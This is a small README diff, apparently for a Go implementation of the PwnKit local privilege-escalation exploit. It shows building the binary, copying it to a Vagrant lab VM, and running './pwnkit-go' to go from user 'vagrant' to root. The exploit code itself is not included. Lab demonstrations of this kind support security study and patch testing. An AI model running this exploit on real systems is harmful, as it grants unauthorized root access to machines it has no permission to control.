@@ -10,15 +10,16 @@ $ make vm
 ...
 
 # build the binary and scp it to the vagrant box
-$  make scp
+$ make scp
 
 # ssh onto the vagrant box
 $ make ssh
 
+# The default user is "vagrant"
 vagrant@ubuntu-focal:/tmp$ whoami
 vagrant
 
-vagrant@ubuntu-focal:$ 
+# execute exploit
 vagrant@ubuntu-focal:/tmp$ cd /tmp && ./pwnkit-go
 $ whoami
 root
